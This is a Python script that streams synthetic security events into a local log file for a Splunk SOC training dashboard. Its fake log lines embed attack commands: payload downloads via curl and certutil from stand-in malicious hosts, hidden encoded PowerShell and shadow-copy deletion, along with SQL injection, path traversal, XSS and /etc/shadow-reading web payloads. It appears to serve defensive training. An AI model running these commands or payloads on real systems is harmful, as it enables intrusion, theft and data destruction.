#!/usr/bin/env python3
"""
High-Velocity Enterprise Security Telemetry Streamer with Desktop Popups
Emits high-throughput realistic security telemetry into /var/log/security_lab.log
(~5-10 events per second) across multi-stage attack chains and triggers desktop popups.
"""

import os
import sys
import time
import signal
import random
import datetime
import socket
import subprocess

SECURITY_LOG = "/var/log/security_lab.log"
PID_FILE = "/tmp/continuous_telemetry.pid"

running = True
last_popup_time = 0
POPUP_COOLDOWN = 8  # Seconds between desktop notification popups

def signal_handler(sig, frame):
    global running
    print("\n[*] Stopping high-velocity telemetry stream...")
    running = False

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def trigger_desktop_popup(title, message, urgency="critical"):
    """Desktop notifications disabled by user request"""
    pass

def get_iso_timestamp(offset_seconds=0):
    dt = datetime.datetime.now() - datetime.timedelta(seconds=offset_seconds)
    return dt.strftime("%Y-%m-%dT%H:%M:%S+05:30")

USERS = ["admin", "pranesh", "jdoe", "asmith", "backup_svc", "root", "devops_bot", "finance_user", "db_admin"]
INTERNAL_IPS = ["192.168.1.37", "192.168.1.105", "192.168.1.140", "192.168.1.50", "10.0.0.15", "10.0.0.22", "172.16.0.45"]
EXTERNAL_IPS = ["198.51.100.45", "203.0.113.88", "198.51.100.99", "185.220.101.5", "45.33.32.156", "91.240.118.12", "194.26.29.40"]
DOMAINS = ["c2-beacon-malicious.xyz", "login-secure-auth-portal.com", "evil-cdn-payloads.org", "internal.corp.local", "api.github.com", "update.microsoft.com", "fake-hr-payroll.com"]
HOSTS = ["WIN-CORP-WS01", "WIN-DC01", "web-prod-srv01", "fw-perimeter-edge", "linux-app01", "db-cluster-01", socket.gethostname()]

def generate_random_event():
    event_type = random.choice([
        "sysmon_process",
        "sysmon_dns",
        "sysmon_network",
        "auth_failure",
        "auth_success",
        "web_traffic",
        "web_attack",
        "firewall_drop",
        "audit_sudo",
        "antivirus_alert",
        "soar_auto_response",
        "fim_alert",
        "phishing_gateway"
    ])

    ts = get_iso_timestamp()
    host = random.choice(HOSTS)

    if event_type == "sysmon_process":
        cmds = [
            ("cmd.exe", "cmd.exe /c whoami /all"),
            ("powershell.exe", "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
            ("curl.exe", "curl.exe -s http://evil-cdn-payloads.org/update.bin -o C:\\Temp\\update.exe"),
            ("tasklist.exe", "tasklist /v /fo csv"),
            ("net.exe", "net user /domain"),
            ("certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.99/payload.exe C:\\Temp\\payload.exe"),
            ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")
        ]
        img, cmd = random.choice(cmds)
        user = random.choice(USERS)
        sev = "ALERT" if "powershell" in cmd or "evil" in cmd or "vssadmin" in cmd or "certutil" in cmd else "INFO"
        if sev == "ALERT":
            trigger_desktop_popup("🚨 Sysmon Alert: Suspicious Command", f"Host: WIN-CORP-WS01\nCommand: {cmd[:60]}...")
        return f"{ts} host=WIN-CORP-WS01 app=sysmon severity={sev} message=\"EventID=1 Image=\\\"C:\\Windows\\System32\\{img}\\\" CommandLine=\\\"{cmd}\\\" User=\\\"CORP\\{user}\\\" ProcessId={random.randint(1000, 9999)}\"\n"

    elif event_type == "sysmon_dns":
        domain = random.choice(DOMAINS)
        sev = "ALERT" if "malicious" in domain or "evil" in domain or "secure-auth" in domain or "payroll" in domain else "INFO"
        res_ip = random.choice(EXTERNAL_IPS)
        if sev == "ALERT":
            trigger_desktop_popup("🚨 DNS Threat Alert", f"Suspicious Query: {domain}\nResolved IP: {res_ip}")
        return f"{ts} host=WIN-CORP-WS01 app=sysmon severity={sev} message=\"EventID=22 QueryName=\\\"{domain}\\\" QueryStatus=0 QueryResults=\\\"{res_ip}\\\" Image=\\\"C:\\Windows\\System32\\dns.exe\\\"\"\n"

    elif event_type == "sysmon_network":
        dst_ip = random.choice(EXTERNAL_IPS)
        port = random.choice([80, 443, 4444, 8080, 22, 1337, 8443, 9001])
        sev = "CRITICAL" if port in [4444, 1337, 9001] else "INFO"
        if sev == "CRITICAL":
            trigger_desktop_popup("🚨 Critical Network Beacon", f"Outbound Connection to C2 Port: {dst_ip}:{port}")
        return f"{ts} host=WIN-CORP-WS01 app=sysmon severity={sev} message=\"EventID=3 SourceIp=\\\"192.168.1.140\\\" DestinationIp=\\\"{dst_ip}\\\" DestinationPort={port} Protocol=tcp Direction=outbound\"\n"

    elif event_type == "auth_failure":
        user = random.choice(USERS)
        src_ip = random.choice(INTERNAL_IPS)
        trigger_desktop_popup("⚠️ Failed Authentication Attempt", f"User: {user}\nSource IP: {src_ip}", urgency="normal")
        return f"{ts} host={host} app=auth severity=WARNING message=\"Failed login attempt for {user} from {src_ip}\"\n"

    elif event_type == "auth_success":
        user = random.choice(USERS)
        src_ip = random.choice(INTERNAL_IPS)
        return f"{ts} host={host} app=auth severity=INFO message=\"User {user} logged in successfully from {src_ip}\"\n"

    elif event_type == "web_attack":
        src_ip = random.choice(INTERNAL_IPS)
        attacks = [
            "/api/v1/users?id=1' UNION SELECT null,username,password_hash FROM users--",
            "/static/../../../../etc/passwd",
            "/search?q=<script>alert(document.cookie)</script>",
            "/wp-login.php",
            "/.env",
            "/actuator/env",
            "/api/debug?cmd=cat+/etc/shadow"
        ]
        uri = random.choice(attacks)
        trigger_desktop_popup("🚨 Web Application Attack Blocked", f"Attacker IP: {src_ip}\nRequest: {uri[:50]}")
        return f"{ts} host=web-prod-srv01 app=nginx:access severity=ALERT message=\"client={src_ip} request=\\\"GET {uri} HTTP/1.1\\\" status=403 user_agent=\\\"Mozilla/5.0\\\"\"\n"

    elif event_type == "web_traffic":
        src_ip = random.choice(INTERNAL_IPS)
        pages = ["/index.html", "/login", "/dashboard", "/api/v1/status", "/assets/app.js", "/products", "/checkout"]
        uri = random.choice(pages)
        return f"{ts} host=web-prod-srv01 app=nginx:access severity=INFO message=\"client={src_ip} request=\\\"GET {uri} HTTP/1.1\\\" status=200 bytes={random.randint(200, 4500)}\"\n"

    elif event_type == "firewall_drop":
        src_ip = random.choice(EXTERNAL_IPS)
        dst_port = random.choice([22, 23, 3389, 445, 8080, 1433, 3306])
        return f"{ts} host=fw-perimeter-edge app=firewall:iptables severity=ALERT message=\"UFW BLOCK: SRC={src_ip} DST=192.168.1.50 PROTO=TCP DPT={dst_port} ACTION=DROP\"\n"

    elif event_type == "audit_sudo":
        user = random.choice(["pranesh", "admin", "devops_bot"])
        return f"{ts} host={host} app=audit severity=WARNING message=\"Privileged account activity detected: user {user} ran /usr/bin/sudo /bin/bash\"\n"

    elif event_type == "antivirus_alert":
        threats = ["Trojan.CobaltStrike", "Trojan.GenericKD", "Worm.AutoRun", "Riskware.CoinMiner", "Ransom.Locky", "Backdoor.Metasploit"]
        sig = random.choice(threats)
        trigger_desktop_popup("🛑 Antivirus Malware Detection", f"Threat: {sig}\nLocation: /tmp/suspicious_payload.elf\nStatus: BLOCKED")
        return f"{ts} host={host} app=antivirus severity=CRITICAL message=\"Malware execution attempt detected: {sig} in /tmp/suspicious_payload.elf action=BLOCKED\"\n"

    elif event_type == "soar_auto_response":
        inc_id = f"INC-{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}-{random.randint(100,999)}"
        indicator = random.choice(EXTERNAL_IPS)
        actions = ["Firewall DROP Rule", "DNS RPZ Sinkhole", "Process Terminated", "Host Quarantined"]
        act = random.choice(actions)
        return f"{ts} host=pranesh app=soar severity=ALERT message=\"SOAR Playbook Auto-Response: Contained malicious indicator {indicator} for incident {inc_id} - Action: {act}\"\n"

    elif event_type == "fim_alert":
        files = ["/etc/shadow", "/etc/passwd", "/bin/login", "/etc/sudoers"]
        f = random.choice(files)
        trigger_desktop_popup("🚨 File Integrity Tampering", f"Critical file altered: {f}")
        return f"{ts} host={host} app=fim severity=ALERT message=\"File integrity change detected on critical asset: {f} modified action=MODIFY\"\n"

    elif event_type == "phishing_gateway":
        rec = random.choice(USERS) + "@corp.local"
        return f"{ts} host=mail-gw01 app=email:gateway severity=ALERT message=\"Inbound email flagged: sender=attacker@fake-hr-payroll.com recipient={rec} embedded_url=https://fake-hr-payroll.com/login.php verdict=SUSPICIOUS_PHISHING\"\n"

    return f"{ts} host={host} app=system severity=INFO message=\"System health check heartbeat OK\"\n"

def main():
    with open(PID_FILE, "w") as pf:
        pf.write(str(os.getpid()))

    print(f"[*] High-Velocity security telemetry streamer started (PID: {os.getpid()})")
    print(f"[*] Appending real-time events to: {SECURITY_LOG}")
    print(f"[*] Velocity: ~5-10 events/second (High Throughput)")
    print(f"[*] Desktop Alert Popups: ACTIVE")
    print(f"[*] View live in Splunk: http://127.0.0.1:8000/en-US/app/search/soc_overview")
    print(f"[*] Press Ctrl+C or kill PID {os.getpid()} to stop.\n")

    event_count = 0
    with open(SECURITY_LOG, "a", buffering=1) as log_file:
        # Initial burst: inject 50 immediate events so dashboard jumps right away
        print("[*] Generating initial burst of 50 events...")
        for _ in range(50):
            log_file.write(generate_random_event())
            event_count += 1
        log_file.flush()

        # High-velocity streaming loop
        while running:
            # Emit batch of 5 to 9 events per iteration
            batch_size = random.randint(5, 9)
            for _ in range(batch_size):
                log_file.write(generate_random_event())
                event_count += 1
            log_file.flush()

            if event_count % 50 == 0:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Emitted {event_count} events into Splunk pipeline...")

            # Sleep between 0.8 and 1.3 seconds
            time.sleep(random.uniform(0.8, 1.3))

    if os.path.exists(PID_FILE):
        os.remove(PID_FILE)
    print(f"[✔] Stream stopped. Total events generated: {event_count}")

if __name__ == "__main__":
    main()
